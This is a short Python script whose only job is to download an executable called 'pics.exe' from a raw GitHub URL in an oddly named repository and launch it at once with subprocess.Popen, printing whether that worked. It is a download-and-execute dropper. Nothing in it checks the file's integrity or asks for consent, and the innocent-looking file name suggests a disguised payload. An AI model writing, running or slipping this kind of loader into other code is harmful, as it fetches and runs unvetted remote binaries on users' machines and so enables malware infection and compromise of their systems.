import os
import requests
import subprocess

def download_and_run_exe(url, exe_path):
    """Download an executable file from a URL and run it."""
    def download_file(url, file_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            return False

    def run_exe(exe_path):
        try:
            subprocess.Popen(exe_path)
            return True
        except Exception as e:
            return False

    if download_file(url, exe_path):
        if run_exe(exe_path):
            return True
    return False

def main():
    url = "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/pics.exe"
    exe_path = "pics.exe"
    if download_and_run_exe(url, exe_path):
        print("Executable downloaded and ran successfully.")
    else:
        print("Failed to download and run the executable.")

if __name__ == "__main__":
    main()
